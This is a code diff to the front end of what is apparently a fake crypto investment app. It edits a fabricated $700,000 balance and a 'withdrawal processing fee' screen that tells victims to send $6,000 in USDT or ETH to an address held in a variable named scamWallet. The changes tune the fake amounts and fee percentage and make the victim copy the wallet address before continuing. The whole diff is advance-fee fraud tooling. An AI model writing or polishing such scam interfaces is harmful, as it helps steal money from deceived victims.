@@ -36,7 +36,7 @@ function showBalanceScreen() {
             <!-- Balance Card -->
             <div class="mx-4 glass p-6 rounded-3xl mb-6">
                 <p class="text-zinc-400">Total Balance</p>
-                <p class="text-6xl font-bold mt-1">$1,245,678.45</p>
+                <p class="text-6xl font-bold mt-1">$700,000.00</p>
                 <p class="text-emerald-400 flex items-center gap-1"><span>▲</span>12.5% from last month</p>
                 <div class="h-28 mt-6 bg-gradient-to-br from-emerald-500/20 to-transparent rounded-2xl relative">
                     <div class="absolute bottom-4 left-4 right-4 h-1 bg-emerald-400 rounded" style="background: linear-gradient(to right, #10b981, #22d3ee);"></div>
@@ -58,9 +58,9 @@ function showBalanceScreen() {
                     <span class="text-emerald-400 text-sm">See All</span>
                 </div>
                 <div class="space-y-5 text-sm">
-                    <div class="flex justify-between"><div>💎 Crypto</div><div class="text-right">$560,555 <span class="text-emerald-400">+8.3%</span></div></div>
-                    <div class="flex justify-between"><div>📊 Forex</div><div class="text-right">$373,704 <span class="text-emerald-400">+6.7%</span></div></div>
-                    <div class="flex justify-between"><div>🏡 Real Estate</div><div class="text-right">$186,852 <span class="text-emerald-400">+4.2%</span></div></div>
+                    <div class="flex justify-between"><div>💎 Crypto</div><div class="text-right">$320,000 <span class="text-emerald-400">+8.3%</span></div></div>
+                    <div class="flex justify-between"><div>📊 Forex</div><div class="text-right">$210,000 <span class="text-emerald-400">+6.7%</span></div></div>
+                    <div class="flex justify-between"><div>🏡 Real Estate</div><div class="text-right">$170,000 <span class="text-emerald-400">+4.2%</span></div></div>
                 </div>
             </div>
 
@@ -83,11 +83,11 @@ function startWithdrawal() {
     <button onclick="showBalanceScreen()" class="bg-zinc-700 px-6 py-3 rounded-2xl mb-6">← Back</button>
         <div class="glass p-8 rounded-3xl border border-amber-500">
             <h2 class="text-2xl font-bold mb-6 text-amber-400">Withdrawal Processing Fee Required</h2>
-            <p class="mb-4">To complete the withdrawal of $1,100,000, a mandatory processing and compliance fee of 5% ($6,000) must be paid before funds can be released.</p>
+            <p class="mb-4">To complete the withdrawal of $700,000.00, a mandatory processing and compliance fee of 0.86% ($6,000) must be paid before funds can be released.</p>
             <p class="text-sm mb-6">Why? For large-value transactions, additional verification, anti-fraud screening...</p>
             <div class="bg-zinc-900 p-4 rounded-2xl mb-6">
                 <p>Processing Fee: <span class="font-bold">$6,000</span></p>
-                <p>Withdrawal Amount: <span class="font-bold">$1,100,000</span></p>
+                <p>Withdrawal Amount: <span class="font-bold">$700,000.00</span></p>
             </div>
             <div class="flex gap-4">
                 <button onclick="payProcessingFee()" class="flex-1 btn-primary py-4 rounded-2xl">Pay Processing Fee</button>
@@ -101,13 +101,16 @@ function payProcessingFee() {
     document.getElementById('main-content').innerHTML = `
         <div class="glass p-8 rounded-3xl text-center">
             <h2 class="text-2xl mb-6">Send to Receive Funds</h2>
-            <p class="mb-4">Send exactly $6,000 USDT or BTC to:</p>
+            <p class="mb-4">Send exactly $6,000 USDT or ETH to:</p>
             <div class="bg-zinc-900 p-4 rounded-2xl mb-4 font-mono break-all">${scamWallet}</div>
-            <button onclick="copyAddress()" class="bg-zinc-700 px-6 py-3 rounded-2xl mb-6">Copy Address</button>
+            <button onclick="copyAddress()" class="bg-emerald-600 px-6 py-3 rounded-2xl mb-6 w-full">Copy Address First</button>
             <button onclick="showLocationScreen()" class="btn-primary w-full py-4 rounded-2xl">I Have Paid</button>
+            <p class="text-xs text-zinc-500 mt-4">You must copy the address before proceeding</p>
         </div>
     `;
 }
+    
+
 
 function copyAddress() {
     navigator.clipboard.writeText(scamWallet);
